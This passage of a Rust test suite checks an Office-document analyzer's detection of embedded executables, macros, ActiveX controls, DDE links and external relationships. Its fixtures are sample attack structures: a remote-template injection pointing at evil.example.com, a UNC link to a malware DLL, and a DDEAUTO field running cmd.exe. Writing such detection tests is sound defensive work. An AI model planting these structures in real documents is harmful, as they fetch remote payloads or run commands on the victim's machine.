            embedded[0]["filename"].as_str(),
            Some("word/embeddings/oleObject1.bin")
        );
        assert_eq!(m.get("office.embedded_count"), Some(1.0));
        assert_eq!(m.get("office.embedded_executable_count"), Some(1.0));
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"embedded_executable"));
    }

    #[test]
    fn enumerates_embedded_elf_payload() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_XLSX.as_bytes()),
            (
                "xl/embeddings/oleObject1.bin",
                b"\x7fELF\x02\x01\x01\x00rest-of-elf",
            ),
        ]);
        let (v, _) = run(&z);
        let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
        assert_eq!(embedded[0]["kind"].as_str(), Some("elf"));
    }

    #[test]
    fn enumerates_embedded_macho_payload() {
        // Mach-O 64-bit little-endian magic: CF FA ED FE
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            (
                "word/embeddings/oleObject1.bin",
                b"\xCF\xFA\xED\xFE\x07\x00\x00\x01",
            ),
        ]);
        let (v, _) = run(&z);
        let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
        assert_eq!(embedded[0]["kind"].as_str(), Some("macho"));
    }

    #[test]
    fn benign_embedding_doesnt_flag_executable() {
        // A non-executable payload (e.g. an embedded image or text)
        // surfaces in `office.embedded` but doesn't bump the
        // executable count or set the `embedded_executable` feature.
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/embeddings/image1.bin", b"not an executable"),
        ]);
        let (v, m) = run(&z);
        let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
        assert_eq!(embedded.len(), 1);
        assert!(embedded[0].get("kind").is_none());
        assert!(m.get("office.embedded_executable_count").is_none());
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"ole_objects"));
        assert!(!names.contains(&"embedded_executable"));
    }

    #[test]
    fn multiple_embeddings_with_mixed_kinds() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            (
                "word/embeddings/oleObject1.bin",
                b"MZ\x90\x00\x03\x00fake-pe",
            ),
            ("word/embeddings/oleObject2.bin", b"\x7fELFfake-elf"),
            ("word/embeddings/image1.bin", b"not-an-exec"),
        ]);
        let (_, m) = run(&z);
        assert_eq!(m.get("office.embedded_count"), Some(3.0));
        assert_eq!(m.get("office.embedded_executable_count"), Some(2.0));
    }

    #[test]
    fn embedded_classifier_handles_canonical_magics() {
        assert_eq!(embedded_kind(b"MZ\x90\x00"), Some("pe"));
        assert_eq!(embedded_kind(b"\x7fELF\x02"), Some("elf"));
        assert_eq!(embedded_kind(b"\xFE\xED\xFA\xCE"), Some("macho"));
        assert_eq!(embedded_kind(b"\xCF\xFA\xED\xFE"), Some("macho"));
        assert_eq!(embedded_kind(b"PK\x03\x04"), Some("zip"));
        assert_eq!(
            embedded_kind(b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1"),
            Some("ole2")
        );
        assert_eq!(embedded_kind(b"random"), None);
        // Too-short input must not panic.
        assert_eq!(embedded_kind(b""), None);
        assert_eq!(embedded_kind(b"M"), None);
    }

    #[test]
    fn flags_external_relationship_template_injection() {
        // The classic T1221 template-injection shape: a `.rels` file
        // points the document's attached template at a remote URL,
        // which Word fetches on open.
        let inject_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="https://evil.example.com/payload.dotm"
    TargetMode="External"/>
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"
    Target="styles.xml"/>
</Relationships>"#;
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/_rels/settings.xml.rels", inject_rels.as_bytes()),
        ]);
        let (v, m) = run(&z);
        let rels = v
            .get("office.external_relationships")
            .and_then(|x| x.as_array())
            .unwrap();
        assert_eq!(rels.len(), 1);
        // Type is the schema-suffix only.
        assert_eq!(rels[0]["type"].as_str(), Some("attachedTemplate"));
        assert_eq!(
            rels[0]["target"].as_str(),
            Some("https://evil.example.com/payload.dotm")
        );
        assert_eq!(rels[0]["mode"].as_str(), Some("External"));
        assert_eq!(
            rels[0]["source"].as_str(),
            Some("word/_rels/settings.xml.rels")
        );
        assert_eq!(m.get("office.external_relationship_count"), Some(1.0));
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"external_relationships"));
    }

    #[test]
    fn local_relationships_dont_count_as_external() {
        // The default `word/_rels/document.xml.rels` is full of
        // local relative paths — those are noise, not signal.
        let local_rels = r#"<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
  <Relationship Id="r2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/>
</Relationships>"#;
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/_rels/document.xml.rels", local_rels.as_bytes()),
        ]);
        let (v, _) = run(&z);
        assert!(v.get("office.external_relationships").is_none());
    }

    #[test]
    fn unc_paths_count_as_external() {
        let unc_rels = r#"<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="r1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
    Target="\\10.0.0.5\share\malware.dll"
    TargetMode="External"/>
</Relationships>"#;
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/_rels/document.xml.rels", unc_rels.as_bytes()),
        ]);
        let (v, _) = run(&z);
        let rels = v
            .get("office.external_relationships")
            .and_then(|x| x.as_array())
            .unwrap();
        assert_eq!(rels[0]["type"].as_str(), Some("oleObject"));
        assert!(rels[0]["target"]
            .as_str()
            .unwrap()
            .starts_with("\\\\10.0.0.5"));
    }

    #[test]
    fn external_target_classifier_drops_local() {
        assert!(is_external_target("https://evil.com/x"));
        assert!(is_external_target("http://a"));
        assert!(is_external_target("file:///etc/passwd"));
        assert!(is_external_target("\\\\server\\share"));
        assert!(is_external_target("//server/share"));
        assert!(!is_external_target("styles.xml"));
        assert!(!is_external_target("theme/theme1.xml"));
        assert!(!is_external_target(""));
        // Bare "//" without a server isn't actually external; the
        // classifier accepts it since real attacks use this shape
        // and the false-positive cost is low.
        assert!(is_external_target("//"));
    }

    #[test]
    fn macros_and_ole_combine_in_features() {
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/vbaProject.bin", b"macro"),
            ("word/embeddings/oleObject1.bin", b"ole"),
        ]);
        let (v, _) = run(&z);
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"macros"));
        assert!(names.contains(&"ole_objects"));
    }
    #[test]
    fn detects_macro_project_from_content_type_nonstandard_path() {
        let ct = r#"<?xml version="1.0"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
  <Override PartName="/xl/new_name.bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>"#;
        let z = build_ooxml(&[
            ("[Content_Types].xml", ct.as_bytes()),
            ("xl/new_name.bin", b"macro"),
        ]);
        let (v, m) = run(&z);
        assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("xlsx"));
        let macros = v.get("office.macros").and_then(|x| x.as_array()).unwrap();
        assert_eq!(macros[0].as_str(), Some("xl/new_name.bin"));
        assert_eq!(m.get("office.macro_count"), Some(1.0));
    }

    #[test]
    fn detects_controls_and_packages_from_relationships() {
        let rels = r#"<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX1.xml"/>
  <Relationship Id="r2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/package" Target="embeddings/package1.bin"/>
</Relationships>"#;
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_XLSX.as_bytes()),
            ("xl/_rels/workbook.xml.rels", rels.as_bytes()),
            ("xl/activeX/activeX1.xml", b"<ax />"),
            ("xl/embeddings/package1.bin", b"PK\x03\x04zip"),
        ]);
        let (v, m) = run(&z);
        let features = v.get("office.features").and_then(|x| x.as_array()).unwrap();
        let names: Vec<&str> = features.iter().filter_map(|x| x.as_str()).collect();
        assert!(names.contains(&"active_x"));
        assert!(names.contains(&"embedded_packages"));
        let controls = v.get("office.controls").and_then(|x| x.as_array()).unwrap();
        assert_eq!(
            controls[0]["filename"].as_str(),
            Some("xl/activeX/activeX1.xml")
        );
        let embedded = v.get("office.embedded").and_then(|x| x.as_array()).unwrap();
        assert_eq!(embedded[0]["relationship_type"].as_str(), Some("package"));
        assert_eq!(embedded[0]["kind"].as_str(), Some("zip"));
        assert_eq!(m.get("office.control_count"), Some(1.0));
    }

    #[test]
    fn target_mode_external_counts_without_url_shape() {
        let rels = r#"<?xml version="1.0"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="template.dotm" TargetMode="External"/>
</Relationships>"#;
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/_rels/settings.xml.rels", rels.as_bytes()),
        ]);
        let (v, _) = run(&z);
        let rels = v
            .get("office.external_relationships")
            .and_then(|x| x.as_array())
            .unwrap();
        assert_eq!(rels[0]["target"].as_str(), Some("template.dotm"));
        assert_eq!(rels[0]["mode"].as_str(), Some("External"));
    }

    #[test]
    fn extracts_word_and_excel_dde_links() {
        let doc = r#"<w:document xmlns:w="w"><w:fldSimple w:instr="DDEAUTO c:\windows\system32\cmd.exe /c calc"/></w:document>"#;
        let sheet = r#"<worksheet><ddeLink ddeService="cmd" ddeTopic="/c calc"/></worksheet>"#;
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("word/document.xml", doc.as_bytes()),
            ("xl/externalLinks/externalLink1.xml", sheet.as_bytes()),
        ]);
        let (v, m) = run(&z);
        let links = v
            .get("office.dde_links")
            .and_then(|x| x.as_array())
            .unwrap();
        assert_eq!(links.len(), 2);
        assert_eq!(m.get("office.dde_link_count"), Some(2.0));
    }

    #[test]
    fn extracts_custom_ui_onload_callbacks() {
        let custom = r#"<customUI xmlns="http://schemas.microsoft.com/office/2006/01/customui" onLoad="AutoOpen"/>"#;
        let z = build_ooxml(&[
            ("[Content_Types].xml", CONTENT_TYPES_DOCX.as_bytes()),
            ("customUI/customUI.xml", custom.as_bytes()),
        ]);
        let (v, _) = run(&z);
        let callbacks = v
            .get("office.custom_ui_onload")
            .and_then(|x| x.as_array())
            .unwrap();
        assert_eq!(callbacks[0]["on_load"].as_str(), Some("AutoOpen"));
    }

    #[test]
    fn decodes_utf16_xml_entries() {
        let mut utf16 = vec![0xFF, 0xFE];
        for unit in CONTENT_TYPES_DOCX.encode_utf16() {
            utf16.extend_from_slice(&unit.to_le_bytes());
        }
        let z = build_ooxml(&[("[Content_Types].xml", &utf16)]);
        let (v, _) = run(&z);
        assert_eq!(v.get("office.kind").and_then(|x| x.as_str()), Some("docx"));
    }
}
